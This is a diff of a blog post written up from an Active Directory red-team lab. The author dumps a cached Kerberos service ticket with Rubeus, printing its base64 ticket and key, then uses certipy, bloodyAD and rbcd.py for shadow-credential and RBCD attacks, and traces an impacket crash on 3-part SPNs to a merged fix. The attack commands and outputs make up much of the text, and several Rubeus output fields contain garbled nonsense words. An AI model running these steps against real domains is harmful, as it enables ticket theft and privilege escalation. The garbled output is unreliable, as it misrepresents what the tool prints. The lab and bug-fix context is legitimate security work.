@@ -7,14 +7,71 @@ render_with_liquid: false
 
 ## context
 
-lately while playing with CRTE lab, I got administrator in one of the machines, and used `rubeus`'s `triage` module to check kerberos tickets cached in memory to find the following:
-![rubeus_triage](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/research/AD/rubeus_triage.png)
+lately while playing with an red teaming lab featuring active directory, I got administrator in one of the machines, and used `rubeus`'s `triage` module to check kerberos tickets cached in memory to find the following:
+```powershell
+PS C:\Users\Public> ./Rubeus.exe triage
+Action: Triage Kerberos Tickets (All Users)
+[*] Current LUID    : 0xf8a511
 
-the interesting user here was `mgmtadmin`, which had his TGT and and a service ticket for `LDAP` cached with an spn format that I haven't seen before, credentials guard was enabled on the machine with UEFI lock, so the TGT was out of the table, now it was the time to extract the service ticket
+-------------------------------------------------------------------------------------------------------------------------------
+| LUID       | UserName                          | Service                                            | EndTime               |
+-------------------------------------------------------------------------------------------------------------------------------
+| 0x17f993   | mgmtadmin @ US.TECHCORP.LOCAL     | krbtgt/US.TECHCORP.LOCAL                           | 7/29/2026 11:49:50 PM |
+| 0x17f993   | mgmtadmin @ US.TECHCORP.LOCAL     | LDAP/us-dc.us.techcorp.local/us.techcorp.local     | 7/29/2026 11:49:50 PM |
+| 0x17f955   | mgmtadmin @ US.TECHCORP.LOCAL     | krbtgt/US.TECHCORP.LOCAL                           | 7/30/2026 12:55:34 AM |
+| 0x17f955   | mgmtadmin @ US.TECHCORP.LOCAL     | LDAP/us-dc.us.techcorp.local/us.techcorp.local     | 7/30/2026 12:55:34 AM |
+| 0x3e4      | us-mgmt$ @ US.TECHCORP.LOCAL      | krbtgt/US.TECHCORP.LOCAL                           | 7/30/2026 1:08:57 AM  |
+| 0x3e4      | us-mgmt$ @ US.TECHCORP.LOCAL      | cifs/us-dc.us.techcorp.local                       | 7/30/2026 1:08:57 AM  |
+| 0xf8a511   | administrator @ us.techcorp.local | HTTP/US-MGMT.US.TECHCORP.LOCAL@US.TECHCORP.LOCAL   | 7/30/2026 4:09:29 AM  |
+| 0x3e7      | us-mgmt$ @ US.TECHCORP.LOCAL      | krbtgt/US.TECHCORP.LOCAL                           | 7/30/2026 1:01:45 AM  |
+| 0x3e7      | us-mgmt$ @ US.TECHCORP.LOCAL      | cifs/us-dc.us.techcorp.local/us.techcorp.local     | 7/30/2026 1:01:45 AM  |
+| 0x3e7      | us-mgmt$ @ US.TECHCORP.LOCAL      | US-MGMT$                                           | 7/30/2026 1:01:45 AM  |
+| 0x3e7      | us-mgmt$ @ US.TECHCORP.LOCAL      | ldap/us-dc.us.techcorp.local/US.TECHCORP.LOCAL     | 7/30/2026 1:01:45 AM  |
+| 0x3e7      | us-mgmt$ @ US.TECHCORP.LOCAL      | netlogon/us-dc.us.techcorp.local/us.techcorp.local | 7/30/2026 1:01:45 AM  |
+| 0x3e7      | us-mgmt$ @ US.TECHCORP.LOCAL      | HOST/us-dc.us.techcorp.local/US                    | 7/29/2026 3:16:45 PM  |
+| 0x3e7      | us-mgmt$ @ US.TECHCORP.LOCAL      | us-mgmt$                                           | 7/29/2026 2:05:13 PM  |
+-------------------------------------------------------------------------------------------------------------------------------
+```
 
-![rubeus_dump](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/research/AD/rubeus_ldap_dump.png)
+the interesting user here was `mgmtadmin`, which had his TGT and and a service ticket for `LDAP` cached with an spn format that I haven't seen before, credential guard was enabled on the machine with UEFI lock, and since it protects against TGT theft but leaves service ticket unprotected, it was the time to extract them for later use
 
-`mgmtadmin` had a `genericWrite` on `US-HELPDESK$` computer object, this meant that there was 2 ways forward, either performing shadow credentials thanks to ADCS being in place, or configuing RBCD, me being more comfortable with linux, I transferd the ticket to my machine and converted it to .ccache to use with impacket, but to my surprise both attacks failed with the same error
+```powershell
+PS C:\Users\Public> ./Rubeus.exe -args dump /service:ldap /luid:0x17f993 /nowrap
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Target service  : ldap
+[*] Target LUID     : 0x17f993
+[*] Current LUID    : 0xf8a511
+
+  UserName                 : mgmtadmin
+  Domain                   : US
+  LogonId                  : 0x17f993
+  UserSID                  : S-1-5-21-3755025061-306865128-3498881829-1104
+  AuthenticationPackage    : Negotiate
+  LogonType                : ShakhputteTisRains
+  LogonTime                : 5/11/2026 1:31:16 AM
+  LogonServer              : US-DC
+  LogonServerDNSDomain     : US.TECHCORP.LOCAL
+  UserPrincipalName        : mgmtadmin@us.techcorp.local
+
+
+    ServiceName              : LDAP/us-dc.us.techcorp.local/us.techcorp.local
+    ServiceRealm             : US.TECHCORP.LOCAL
+    UserName                 : mgmtadmin (ExtensivesTadTage)
+    UserRealm                : US.TECHCORP.LOCAL
+    StartTime                : 7/29/2026 1:59:41 PM
+    EndTime                  : 7/29/2026 11:49:50 PM
+    RenewTill                : 8/5/2026 4:34:50 AM
+    Flags                    : FlyChronSuperclerUnctively, TuleFruitlikeBelicite, CanneInelyInceSaker, PatorFlosistIrnhip, StotzancesNonenHatism
+    KeyType                  : AvoureOstumZoolsKived
+    Base64(key)              : t9vfJpg/950gjRNW3B0dCz2PxlMovzUjoDuukVy1rNs=
+    Base64EncodedTicket      :
+
+        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 > ticket.b64
+```
+
+
+checking bloodhound data, `mgmtadmin` had a `genericWrite` on `US-HELPDESK$` computer object in the same domain, this meant that there was 2 ways forward, either performing shadow credentials thanks to ADCS being in place, or configuing RBCD, me being more comfortable with linux, I transferd the ticket to my machine and converted it to .ccache to use with impacket, but to my surprise both attacks failed with the same error
 ```bash
 $ echo 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 > ticket.b64
 $ base64 -d ticket.b64 > ticket.kirbi
@@ -35,7 +92,7 @@ Valid starting       Expires              Service principal
 ## tools failing
 
 ```bash
-$ certipy -debug shadow auto -u mgmtadmin@US.TECHCORP.LOCAL -k -no-pass -account 'US-HELPDESK' -dc-ip 192.168.1.2 -target-ip 192.168.1.2 -target US-DC -dc-host US-DC
+$ certipy -debug shadow auto -u mgmtadmin@US.TECHCORP.LOCAL -k -no-pass -account 'US-HELPDESK' -dc-ip 192.168.1.2 -target-ip 192.168.1.2 -target US-DC.us.techcorp.local -dc-host US-DC.us.techcorp.local
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [+] Domain retrieved from CCache: US.TECHCORP.LOCAL
@@ -124,7 +181,7 @@ IndexError: list index out of range
 ```
 
 the attack perfectly worked with bloodyad tho so I knew the problem wasn't from my side
-```
+```bash
 $ bloodyAD --host us-dc.us.techcorp.local -d US.TECHCORP.LOCAL -k --dc-ip 192.168.1.2   add shadowCredentials 'US-HELPDESK$'
 [+] KeyCredential generated with following sha256 of RSA key: 01465bb4a193e91702fe253e5d49201f3fe89420520d84b6052d082e3294fb2f
 [+] TGT stored in ccache file US-HELPDESK_rm.ccache
@@ -136,7 +193,7 @@ A bit of googling told me that bloodyad uses minikerberos library instead of imp
 
 ## understanding 3-part SPNs
 
-long story short, I found something called [MS-KILE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9) (microsoft Kerberos Protocol Extensions) which describes microsoft implementation details on top of the standard kerberos v5 (RFC 4120), quoting the MS-KILE spec
+long story short, I found something called [MS-KILE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9) (microsoft Kerberos Protocol Extensions) which describes microsoft implementation details on top of the standard kerberos v5 (RFC 4120), the SPN naming convention is mentioned [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/04033bd5-913c-4c78-a398-b549b09e65d9) and [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/cd328386-4d97-4666-be33-056545c1) among other places, quoting the MS-KILE spec
 ```
 An SPN is a string of the following format.
 
@@ -152,7 +209,7 @@ per microsoft docs this also has the following [security implications](https://l
 
 ## the bug
 
-impacket stores parsed Kerberos tickets in a `CCache` object, and whenever a tool needs a ticket for a specific service, it calls `CCache.getCredential(server, anySPN=True)`, This method first tries to find an exact match for the requested SPN, and if that fails (which is common, since tools often ask for a slightly different SPN format than what's actually cached), it falls back to looping over every cached credential and comparing SPNs manually to find the closest match. this is the anySPN fallback path, hence the the following lines in the output
+impacket stores parsed Kerberos tickets in a `CCache` object, and whenever a tool needs a ticket for a specific service, it calls `CCache.getCredential(server, anySPN=True)`, This method first tries to find an exact match for the requested SPN, and if that fails (which is common, since tools often ask for a slightly different SPN format than what's actually cached), it falls back to looping over every cached credential and comparing SPNs manually to find the closest match. this is the `anySPN` fallback path, hence the the following lines in the output
 ```bash
 [+] SPN LDAP/US-DC@US.TECHCORP.LOCAL not found in cache
 [+] AnySPN is True, looking for another suitable SPN
@@ -172,20 +229,22 @@ That loop in `impacket/krb5/ccache.py` is where the crash lives:
 ```
 
 the problem is in the following part
-```
+```python
 c['server'].prettyPrint().upper().split(b'/')[1].split(b'@')[1])
 ```
-impacket didn't account for the 3 parts spn, so with it being `LDAP/us-dc.us.techcorp.local/us.techcorp.local@US.TECHCORP.LOCAL` in this case the first `.split(b'/')[1]` returns `us-dc.us.techcorp.local`, since it's doesn't have `@` the second `split(b'@')[1]` throws an exception
+impacket didn't account for 3-part spns, so with it being `LDAP/us-dc.us.techcorp.local/us.techcorp.local@US.TECHCORP.LOCAL` in this case the first `.split(b'/')[1]` returns `us-dc.us.techcorp.local`, since it's doesn't have `@` the second `split(b'@')[1]` throws an exception
 
-and since impacket iterates over the tickets sequentially, just having a 3-parts SPN ticket cached will block you from using the other tickets that resides right after that one in the cache, as impacket will crash as soon as it tries to parse it
+and since impacket iterates over the tickets sequentially, just having a 3-parts SPN ticket cached will block you from using the other tickets that resides right after that one in the cache (i.e having multiple tickets cached for the same user), as impacket will crash as soon as it tries to parse it
 
-I've opened a [PR](https://github.com/fortra/impacket/pull/2242) that has been yet to get any responses, but if you need to use this before it gets merged you can apply the [following patch](https://patch-diff.githubusercontent.com/raw/fortra/impacket/pull/2242.patch)
+## the patch
+
+I've opened a [PR](https://github.com/fortra/impacket/pull/2242) that has been yet to get any responses, but if you need to use this before it gets merged you can apply the [following patch](https://patch-diff.githubusercontent.com/raw/fortra/impacket/pull/2242.patch) (edit: PR is now merged :), all the love for the maintainers )
 
 after that the tools simply worked
 
 ### certipy
 
-```
+```bash
 $ certipy  shadow auto -u mgmtadmin@US.TECHCORP.LOCAL -k -no-pass -account 'US-HELPDESK' -dc-ip 192.168.1.2 -target-ip 192.168.1.2 -target US-DC -dc-host US-DC
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
@@ -212,7 +271,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 ### rbcd.py
 
-```
+```bash
 $ rbcd.py  us.techcorp.local/mgmtadmin -k -no-pass -delegate-to 'US-HELPDESK$' -delegate-from 'EVIL-PC$' -dc-ip 192.168.1.2 -action 'write' -use-ldaps
 Impacket v0.14.0.dev0+20260730.15419.c1c4d6ad - Copyright Fortra, LLC and its affiliated companies
 
